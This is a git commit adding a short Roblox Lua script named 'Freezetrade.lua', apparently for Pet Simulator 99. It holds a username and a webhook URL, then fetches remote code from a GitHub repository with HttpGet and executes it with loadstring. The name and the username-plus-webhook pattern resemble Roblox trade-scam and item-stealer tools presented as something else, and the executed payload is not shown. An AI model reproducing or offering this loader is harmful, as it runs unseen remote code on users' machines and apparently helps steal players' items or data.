72f743496755905ae02efd3d4b24eeadb7b239ac
azure-script <azharmobasher706@gmail.com>
2025-04-17 09:13:55 +0100

    Create Freezetrade.lua

---
+++ Freezetrade.lua
@@ -0,0 +1,8 @@
+
+
+
+Username = "m1234ao" -- << Your Username
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=clBhemU1ZkloX0lVdFU0ZGtfdTVTZzozSzBVWkFfVVFaMzVDVkJRMjFZa3NCNEtjcW83cjFBNkRyN2kyd3JBeHktX09Gc1RmalI4d3FCVksxOGRNeE9wcm5sNWNUakJ1SEFaRFI0ZEVWS044dVkzeHFMMjRWM3lBN3Z2NzZCa0VoV1JxRkRiZGR2dGYzUS1xR3Q3YXZNZklKVFluUndQYlVnMDljS2F1NjJuVlNtSDN2QkMwbUFncXRlQ1JyalV5MEtYS2NZYW92cnJRTXhmWnJqcGJITGQ" -- << Your Webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
+
